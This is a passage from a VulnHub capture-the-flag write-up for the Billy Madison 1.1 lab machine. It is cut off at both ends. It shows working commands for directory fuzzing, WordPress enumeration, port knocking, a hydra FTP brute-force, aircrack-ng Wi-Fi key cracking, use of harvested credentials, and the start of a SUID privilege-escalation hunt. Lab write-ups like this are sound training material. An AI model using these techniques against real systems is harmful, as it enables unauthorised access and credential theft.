+</pre></table></code></div></div><ul><li>Password/Directory?</ul></ol><h2 id="tcp139445-smb---rabbit-hole">TCP/139,445 (SMB) - Rabbit Hole <a href="#tcp139445-smb---rabbit-hole" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Download all files from <code class="language-plaintext highlighter-rouge">EricsSecretStuff</code> fileshare<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/smb]
+ └─# smbclient //$ip/EricsSecretStuff -c 'prompt;recurse;mget *'
+ Enter WORKGROUP\root's password: 
+ getting file \._.DS_Store of size 4096 as ._.DS_Store (250.0 KiloBytes/sec) (average 250.0 KiloBytes/sec)
+ getting file \ebd.txt of size 35 as ebd.txt (17.1 KiloBytes/sec) (average 224.1 KiloBytes/sec)
+ getting file \.DS_Store of size 6148 as .DS_Store (600.4 KiloBytes/sec) (average 358.5 KiloBytes/sec)
+</pre></table></code></div></div><li>View files <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220221221922.png" alt="" data-proofer-ignore><li>Proceed to <code class="language-plaintext highlighter-rouge">TCP/69</code></ol><h2 id="tcp69-http---rabbit-hole">TCP/69 (HTTP) - Rabbit Hole <a href="#tcp69-http---rabbit-hole" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Find out the service running @ <code class="language-plaintext highlighter-rouge">TCP/69</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
+ └─# nc $ip 69
+ test
+ &lt;head&gt;
+ &lt;title&gt;Error response&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+ &lt;h1&gt;Error response&lt;/h1&gt;
+ &lt;p&gt;Error code 400.
+ &lt;p&gt;Message: Bad request syntax ('test').
+ &lt;p&gt;Error code explanation: 400 = Bad request syntax or unsupported method.
+ &lt;/body&gt;
+</pre></table></code></div></div><ul><li>HTTP</ul><li><a href="https://thegeekpage.com/err-unsafe-port/">Fix</a> <code class="language-plaintext highlighter-rouge">ERR UNSAFE PORT</code><li>FFUF<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
+└─# ffuf -u http://$ip:69/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.txt,.php,.html'
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.110.34:69/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .txt .php .html 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+	
+index.php               [Status: 200, Size: 6589, Words: 565, Lines: 133]
+readme.html             [Status: 200, Size: 9231, Words: 995, Lines: 108]
+wp-admin                [Status: 302, Size: 231, Words: 22, Lines: 4]
+wp-login.php            [Status: 200, Size: 2021, Words: 136, Lines: 58]
+xmlrpc.php              [Status: 200, Size: 42, Words: 6, Lines: 1]
+:: Progress: [18460/18460] :: Job [1/1] :: 811 req/sec :: Duration: [0:00:26] :: Errors: 0 
+</pre></table></code></div></div><ul><li>Wordpress CMS</ul><li>Enumerate wordpress<ol><li>Enumerate wordpress version &amp; users<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
+ └─# wpscan --no-update --disable-tls-checks --url http://$ip:69 -e u -f cli-no-color 2&gt;&amp;1 | tee "/root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/tcp69/tcp_69_http_wpscan.txt"
+
+ [i] User(s) Identified:
+
+ [+] admin
+  | Found By: Author Posts - Display Name (Passive Detection)
+  | Confirmed By: Author Id Brute Forcing - Display Name (Aggressive Detection)
+</pre></table></code></div></div><li>Enumerate wordpress plugins<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
+ └─# wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://$ip:69 -e ap -f cli-no-color 2&gt;&amp;1 | tee "/root/vulnHub/Billy_Madison_1.1/192.168.110.34/scans/tcp69/tcp_69_http_wpscan_plugins.txt"
+
+ [i] No plugins Found.
+</pre></table></code></div></div></ol><li>Proceed to <code class="language-plaintext highlighter-rouge">exschmenuating</code>, does not exist<li><code class="language-plaintext highlighter-rouge">TCP/69</code> is a rabbithole</ol><h2 id="tcp80-http---directory-enumeration">TCP/80 (HTTP) - Directory Enumeration <a href="#tcp80-http---directory-enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Proceed to <code class="language-plaintext highlighter-rouge">http://192.168.110.34/index.php</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220221222213.png" alt="" data-proofer-ignore><li>Proceed to <code class="language-plaintext highlighter-rouge">exschmenuating</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220222031420.png" alt="" data-proofer-ignore><ul><li><code class="language-plaintext highlighter-rouge">veronica</code> is somewhere in the filename<li><code class="language-plaintext highlighter-rouge">captured</code> suggests it is a <code class="language-plaintext highlighter-rouge">.pcap</code>,<code class="language-plaintext highlighter-rouge">cap</code>,<code class="language-plaintext highlighter-rouge">.captured</code> file<li><code class="language-plaintext highlighter-rouge">veronica</code> as part of her passwords</ul><li>Create a wordlist (<code class="language-plaintext highlighter-rouge">veronica.txt</code>) by extracting veronica from <code class="language-plaintext highlighter-rouge">rockyou.txt</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
+ └─# cat /usr/share/wordlists/rockyou.txt | grep veronica &gt; veronica.txt
+</pre></table></code></div></div><li>FFUF<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
+ └─# ffuf -u http://192.168.110.34/exschmenuating/FUZZ -w veronica.txt -e '.pcap,.cap,.captured,.html,.php'
+
+         /'___\  /'___\           /'___\       
+        /\ \__/ /\ \__/  __  __  /\ \__/       
+        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+          \ \_\   \ \_\  \ \____/  \ \_\       
+           \/_/    \/_/   \/___/    \/_/       
+
+        v1.3.1 Kali Exclusive &lt;3
+ ________________________________________________
+
+  :: Method           : GET
+  :: URL              : http://192.168.110.34/exschmenuating/FUZZ
+  :: Wordlist         : FUZZ: veronica.txt
+  :: Extensions       : .pcap .cap .captured .html .php 
+  :: Follow redirects : false
+  :: Calibration      : false
+  :: Timeout          : 10
+  :: Threads          : 40
+  :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ ________________________________________________
+ 012987veronica.cap      [Status: 200, Size: 8700, Words: 353, Lines: 193]
+ :: Progress: [4638/4638] :: Job [1/1] :: 102 req/sec :: Duration: [0:00:04] :: Errors: 6 ::
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">012987veronica.cap</code></ul></ol><h2 id="wireshark-analysis">Wireshark Analysis <a href="#wireshark-analysis" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><code class="language-plaintext highlighter-rouge">012987veronica.cap</code> captured email conversation between Veronica &amp; Eric.<li>Mail 2 and 3 contains interesting information<li>View the conversation w/ filter: <code class="language-plaintext highlighter-rouge">tcp.stream eq 0-5</code><ul><li>Mail 2:<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre>  EHLO kali
+  MAIL FROM:&lt;vvaughn@polyfector.edu&gt;
+  RCPT TO:&lt;eric@madisonhotels.com&gt;
+  DATA
+  Date: Sat, 20 Aug 2016 21:57:00 -0500
+  To: eric@madisonhotels.com
+  From: vvaughn@polyfector.edu
+  Subject: test Sat, 20 Aug 2016 21:57:00 -0500
+  X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
+  RE: VIRUS ALERT!
+
+  Eric,
+
+  Thanks for your message. I tried to download that file but my antivirus blocked it.
+
+  Could you just upload it directly to us via FTP?  We keep FTP turned off unless someone connects with the "Spanish Armada" combo.
+
+  https://www.youtube.com/watch?v=z5YU7JwVy7s
+
+  -VV
+  .
+  QUIT
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">Spanish Armada combo</code><li>The video contains the port knocking sequence.<ul><li>From <code class="language-plaintext highlighter-rouge">0:27 - 0:46</code><li><code class="language-plaintext highlighter-rouge">1466, 67, 1469, 1514, 1981, 1986</code></ul></ul><li>Mail 3<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>  EHLO kali
+  MAIL FROM:&lt;eric@madisonhotels.com&gt;
+  RCPT TO:&lt;vvaughn@polyfector.edu&gt;
+  DATA
+  Date: Sat, 20 Aug 2016 21:57:11 -0500
+  To: vvaughn@polyfector.edu
+  From: eric@madisonhotels.com
+  Subject: test Sat, 20 Aug 2016 21:57:11 -0500
+  X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
+  RE[2]: VIRUS ALERT!
+
+  Veronica,
+
+  Thanks that will be perfect.  Please set me up an account with username of "eric" and password "ericdoesntdrinkhisownpee."
+
+  -Eric
+  .
+  QUIT
+</pre></table></code></div></div><ul><li>eric:ericdoesntdrinkhisownpee.</ul></ul></ol><h2 id="port-knocking">Port Knocking <a href="#port-knocking" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Port Knock<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit/wireshark]
+ └─# knock -v $ip 1466 67 1469 1514 1981 1986
+ hitting tcp 192.168.110.34:1466
+ hitting tcp 192.168.110.34:67
+ hitting tcp 192.168.110.34:1469
+ hitting tcp 192.168.110.34:1514
+ hitting tcp 192.168.110.34:1981
+ hitting tcp 192.168.110.34:1986
+</pre></table></code></div></div><li>Check for newly opened ports<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1]
+ └─# nmap $ip -p-
+ PORT     STATE  SERVICE
+ 21/tcp   open   ftp
+ 22/tcp   open   ssh
+ 23/tcp   open   telnet
+ 69/tcp   open   tftp
+ 80/tcp   open   http
+ 137/tcp  closed netbios-ns
+ 138/tcp  closed netbios-dgm
+ 139/tcp  open   netbios-ssn
+ 445/tcp  open   microsoft-ds
+ 2525/tcp open   ms-v-worlds
+ MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC)
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">TCP/21</code></ul></ol><h2 id="tcp21-ftp">TCP/21 (FTP) <a href="#tcp21-ftp" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Access FTP w/ eric:ericdoesntdrinkhisownpee, check for write access<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit/wireshark]
+ └─# ftp $ip
+ Connected to 192.168.110.34.
+ 220 Welcome to ColoradoFTP - the open source FTP server (www.coldcore.com)
+ Name (192.168.110.34:root): eric 
+ 331 User name okay, need password.
+ Password: 
+ 230 User logged in, proceed.
+ Remote system type is UNIX.
+ Using binary mode to transfer files.
+ ftp&gt; passive
+ Passive mode: off; fallback to active mode: off.
+ ftp&gt; put test
+ local: test remote: test
+ 200 PORT command successful.
+ 150 Opening I mode data connection for test.
+      0        0.00 KiB/s 
+ 226 Transfer completed for "test".
+ ftp&gt; dir
+ 200 PORT command successful.
+ 150 Opening A mode data connection for /.
+ -rwxrwxrwx 1 ftp 1287 Aug 20 12:49 9129
+ -rwxrwxrwx 1 ftp 5367 Aug 20 12:49 39772
+ -rwxrwxrwx 1 ftp 5208 Aug 20 12:49 39773
+ -rwxrwxrwx 1 ftp 6326 Aug 20 12:49 40049
+ -rwxrwxrwx 1 ftp 9132 Aug 20 12:49 40054
+ -rwxrwxrwx 1 ftp 868 Sep 01 10:42 .notes
+ -rwxrwxrwx 1 ftp 0 Feb 21 22:15 test
+ 226 Transfer completed.
+</pre></table></code></div></div><li>Download all files<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/ftp]
+ └─# wget -m --no-passive ftp://eric:ericdoesntdrinkhisownpee@$ip
+</pre></table></code></div></div><li>View the files<ul><li><code class="language-plaintext highlighter-rouge">.notes</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220223205335.png" alt="" data-proofer-ignore><ul><li>The video contains the blanks<ul><li>From <code class="language-plaintext highlighter-rouge">0:07 - 0:08</code><li>“My kid will be a soccer player”</ul><li>WiFi Password from Veronica’s FTP folders.</ul></ul></ol><h2 id="tcp2525-smtp">TCP/2525 (SMTP) <a href="#tcp2525-smtp" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Send an email to Eric<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
+ └─# telnet $ip 2525
+ Trying 192.168.110.34...
+ Connected to 192.168.110.34.
+ Escape character is '^]'.
+ 220 BM ESMTP SubEthaSMTP null
+ MAIL FROM: asdf
+ 250 Ok
+ RCPT TO: eric@madisonhotels.com
+ 250 Ok
+ DATA
+ 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+ My kid will be a soccer player
+ .
+ 250 Ok
+ QUIT
+ 221 Bye
+ Connection closed by foreign host.
+</pre></table></code></div></div><li>Check for newly opened ports<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/http]
+ └─# nmap $ip -v -p-
+
+ PORT     STATE  SERVICE
+ 21/tcp   open   ftp
+ 22/tcp   open   ssh
+ 23/tcp   open   telnet
+ 69/tcp   open   tftp
+ 80/tcp   open   http
+ 137/tcp  closed netbios-ns
+ 138/tcp  closed netbios-dgm
+ 139/tcp  open   netbios-ssn
+ 445/tcp  open   microsoft-ds
+ 1974/tcp open   drp
+ 2525/tcp open   ms-v-worlds
+ MAC Address: 08:00:27:D8:4B:D5 (Oracle VirtualBox virtual NIC)
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">TCP/1974</code></ul></ol><h2 id="tcp1974-ssh">TCP/1974 (SSH) <a href="#tcp1974-ssh" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Failed to SSH w/ eric:ericdoesntdrinkhisownpee<li>Earlier, Eric mentioned that we are able to login w/ his WiFi password, and it could be in Veronica’s FTP Folder. Veronica is likely to use a password based off her name.</ol><h2 id="tcp21ftp---bruteforce">TCP/21(FTP) - Bruteforce <a href="#tcp21ftp---bruteforce" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Bruteforce FTP against <code class="language-plaintext highlighter-rouge">veronica.txt</code> wordlist<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/exploit]
+ └─# hydra -l veronica -P veronica.txt -e nsr ftp://$ip
+ Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-23 21:09:24
+ [DATA] max 16 tasks per 1 server, overall 16 tasks, 776 login tries (l:1/p:776), ~49 tries per task
+ [DATA] attacking ftp://192.168.110.34:21/
+ [21][ftp] host: 192.168.110.34   login: veronica   password: babygirl_veronica07@yahoo.com
+ 1 of 1 target successfully completed, 1 valid password found
+ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-23 21:09:43
+</pre></table></code></div></div><ul><li>veronica:babygirl_veronica07@yahoo.com</ul><li>Download all files<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp]
+ └─# wget -m --no-passive ftp://veronica:babygirl_veronica07%40yahoo.com@$ip
+</pre></table></code></div></div><li>View files<ul><li><code class="language-plaintext highlighter-rouge">email-from-billy.eml</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220223214116.png" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">eg-01.cap</code><ul><li>packet capture file</ul></ul></ol><h2 id="crack-cap-file">Crack .cap file <a href="#crack-cap-file" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li><code class="language-plaintext highlighter-rouge">eg-01.cap</code> captured WiFi traffic<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp/192.168.110.34]
+ └─# tcpdump -r eg-01.cap 
+ reading from file eg-01.cap, link-type IEEE802_11 (802.11), snapshot length 65535
+</pre></table></code></div></div><ul><li><a href="https://www.electronics-notes.com/articles/connectivity/wifi-ieee-802-11/what-is-wifi.php#:~:text=The%20technical%20name%20for%20WiFi,devices%20from%20a%20router%20%2F%20hotspot.&amp;text=Wi-Fi%20wireless%20connectivity%20is%20an%20established%20part%20of%20everyday%20life."><code class="language-plaintext highlighter-rouge">IEEE802_11</code></a></ul><li>Crack <code class="language-plaintext highlighter-rouge">eg-01.cap</code> w/ <code class="language-plaintext highlighter-rouge">aircrack-ng</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/Billy_Madison_1.1/192.168.110.34/loot/veronica_ftp/192.168.110.34]
+ └─# aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt 
+	
+                                Aircrack-ng 1.6 
+
+   [00:12:25] 3051073/14344392 keys tested (4151.08 k/s) 
+
+   Time left: 45 minutes, 20 seconds                         21.27%
+
+                        KEY FOUND! [ triscuit* ]
+
+
+   Master Key     : 9E 8B 4F E6 CC 5E E2 4C 46 84 D2 AF 59 4B 21 6D 
+                    B5 3B 52 84 04 9D D8 D8 83 67 AF 43 DC 60 CE 92 
+
+   Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+
+   EAPOL HMAC     : 86 63 53 4B 77 52 82 0C 73 4A FA CA 19 79 05 33 
+
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220223220417.png" alt="" data-proofer-ignore></p><ul><li>eric:triscuit*</ul></ol><h2 id="tcp1974-ssh-1">TCP/1974 (SSH) <a href="#tcp1974-ssh-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>SSH w/ eric:triscuit* <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Billy Madison 1.1/images/Pasted%20image%2020220223221419.png" alt="" data-proofer-ignore></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="root---via-suid-binary">Root - Via SUID Binary <a href="#root---via-suid-binary" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Enumerate SUID binaries<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre> eric@BM:/tmp$ find / -perm -4000 2&gt;/dev/null 
+ /usr/local/share/sgml/donpcgd
+ /usr/bin/sudo
+ /usr/bin/pkexec
+ /usr/bin/passwd
+ /usr/bin/newgidmap
+ /usr/bin/chsh
+ /usr/bin/gpasswd
+ /usr/bin/newuidmap
+ /usr/bin/newgrp
+ /usr/bin/at
+ /usr/bin/chfn
+ /usr/bin/ubuntu-core-launcher
+ /usr/lib/eject/dmcrypt-get-device
+ /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+ /usr/lib/policykit-1/polkit-agent-helper-1
+ /usr/lib/openssh/ssh-keysign
+ /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+ /bin/mount
+ /bin/su
+ /bin/umount
+ /bin/fusermount
+ /bin/ping6
+ /bin/ping
+ /bin/ntfs-3g
+ eric@BM:/tmp$ 
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">/usr/local/share/sgml/donpcgd</code>, is an unknown binary</ul><li>Execute <code class="language-plaintext highlighter-rouge">/usr/local/share/sgml/donpcgd</code> to see what it does<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre> eric@BM:/tmp$ /usr/local/share/sgml/donpcgd
+ Usage: /usr/local/share/sgml/donpcgd path1 path2
+ eric@BM:/tmp$ 
